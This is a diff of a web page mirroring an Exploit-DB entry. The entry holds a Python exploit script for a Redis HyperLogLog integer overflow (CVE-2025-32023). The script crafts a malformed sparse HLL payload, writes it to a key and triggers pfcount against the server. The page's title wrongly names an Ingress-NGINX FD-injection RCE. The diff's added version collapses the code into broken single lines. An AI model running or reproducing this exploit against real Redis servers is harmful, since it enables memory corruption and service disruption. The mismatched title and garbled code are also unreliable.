@@ -4,114 +4,58 @@
 <meta charset="UTF-8">
 <title>OffSec’s Exploit Database Archive</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
-  h1 { color: #00d9ff; margin-bottom: 0.5em; }
-  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
-  img { max-width: 100%; height: auto; border-radius: 8px; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
   a { color: #00d9ff; }
-  p { margin-bottom: 1em; }
-  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
   code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
-  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
-
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
   .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
   .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
   .article-elevator-btn:hover { background: rgba(10,14,39,1); }
-
 </style>
 </head>
 <body>
   <h1>OffSec’s Exploit Database Archive</h1>
   <div class="metadata">
-    Source: Exploit-DB | Date: 2/4/2026 | Lang: EN |
-    <a href="https://www.exploit-db.com/exploits/52477" target="_blank">Original Article</a>
+    Source: Exploit-DB | Date: 2/4/2026 1:00:00 AM | <a href="https://www.exploit-db.com/exploits/52477" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
   </div>
   <div class="content">
-    <div><div>
-
-                        
-                        <pre><code># Exploit Title:  Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE 
-# Date: 2025-10-07
+    <div><div> <pre><code># Exploit Title: Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE # Date: 2025-10-07
 # Exploit Author: Beatriz Fresno Naumova
 # Vendor Homepage: https://redis.io/
 # Software Link: https://redis.io/
-# Version: Affects :&gt;= 8.0.0, &lt; 8.0.3 
-# Tested on: Ubuntu 22.04
-# CVE: CVE-2025-32023
-
-import redis
-import sys
-
-# --- Configuration ---
+# Version: Affects :&gt;= 8.0.0, &lt; 8.0.3 # Tested on: Ubuntu 22.04
+# CVE: CVE-2025-32023 import redis
+import sys # --- Configuration ---
 REDIS_HOST = 'localhost'
 REDIS_PORT = 6379
-REDIS_KEY = 'hll:exp'
-
-# HLL encoding type (1 = sparse)
-HLL_SPARSE = 1
-
-
-def p8(value):
-    """Convert integer to single byte."""
-    return bytes([value])
-
-
-def xzero(size):
-    """
-    Construct an 'xzero' run for sparse HLL:
-    Creates a run-length encoding entry of zeroes with a specific size.
-    """
-    if not (1 &lt;= size &lt;= 0x4000):
-        raise ValueError("Invalid xzero size: must be between 1 and 0x4000")
-    size -= 1
-    return p8(0b01_000000 | (size &gt;&gt; 8)) + p8(size &amp; 0xff)
-
-
-def build_malformed_hll():
-    """
-    Construct a malformed HLL payload that overflows internal counters.
-    """
-    payload = b'HYLL'                # Magic header
-    payload += p8(HLL_SPARSE)        # Encoding type: sparse
-    payload += p8(0) * 3             # Reserved
-    payload += p8(0) * 8             # Unused (padding)
-    
-    assert len(payload) == 0x10      # Check header size
-    
-    # Append enough xzero runs to cause overflow
-    payload += xzero(0x4000) * 0x20000  # == -0x80000000 when cast to signed int
-
-    # Add one more run to complete the structure
-    payload += p8(0b11111111)  # Runlen=4, regval=0x20 (but malformed)
-
-    return payload
-
-
-def main():
-    try:
-        print(f"[*] Connecting to Redis at {REDIS_HOST}:{REDIS_PORT}...")
-        r = redis.Redis(REDIS_HOST, REDIS_PORT)
-
-        print("[*] Building malformed HyperLogLog payload...")
-        hll_payload = build_malformed_hll()
-
-        print(f"[*] Writing malformed HLL to key: {REDIS_KEY}")
-        r.set(REDIS_KEY, hll_payload)
-
-        print("[*] Triggering HLL merge operation (pfcount)...")
-        r.pfcount(REDIS_KEY, REDIS_KEY)
-
-        print("[+] Exploit triggered successfully.")
-    except Exception as e:
-        print(f"[!] Exploit failed: {e}")
-        sys.exit(1)
-
-
-if __name__ == "__main__":
-    main()
-            </code></pre>
-
-                    </div></div>
+REDIS_KEY = 'hll:exp' # HLL encoding type (1 = sparse)
+HLL_SPARSE = 1 def p8(value): """Convert integer to single byte.""" return bytes([value]) def xzero(size): """ Construct an 'xzero' run for sparse HLL: Creates a run-length encoding entry of zeroes with a specific size. """ if not (1 &lt;= size &lt;= 0x4000): raise ValueError("Invalid xzero size: must be between 1 and 0x4000") size -= 1 return p8(0b01_000000 | (size &gt;&gt; 8)) + p8(size &amp; 0xff) def build_malformed_hll(): """ Construct a malformed HLL payload that overflows internal counters. """ payload = b'HYLL' # Magic header payload += p8(HLL_SPARSE) # Encoding type: sparse payload += p8(0) * 3 # Reserved payload += p8(0) * 8 # Unused (padding) assert len(payload) == 0x10 # Check header size # Append enough xzero runs to cause overflow payload += xzero(0x4000) * 0x20000 # == -0x80000000 when cast to signed int # Add one more run to complete the structure payload += p8(0b11111111) # Runlen=4, regval=0x20 (but malformed) return payload def main(): try: print(f"[*] Connecting to Redis at {REDIS_HOST}:{REDIS_PORT}...") r = redis.Redis(REDIS_HOST, REDIS_PORT) print("[*] Building malformed HyperLogLog payload...") hll_payload = build_malformed_hll() print(f"[*] Writing malformed HLL to key: {REDIS_KEY}") r.set(REDIS_KEY, hll_payload) print("[*] Triggering HLL merge operation (pfcount)...") r.pfcount(REDIS_KEY, REDIS_KEY) print("[+] Exploit triggered successfully.") except Exception as e: print(f"[!] Exploit failed: {e}") sys.exit(1) if __name__ == "__main__": main() </code></pre> </div></div>
   </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'auto' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
 </body>
 </html>
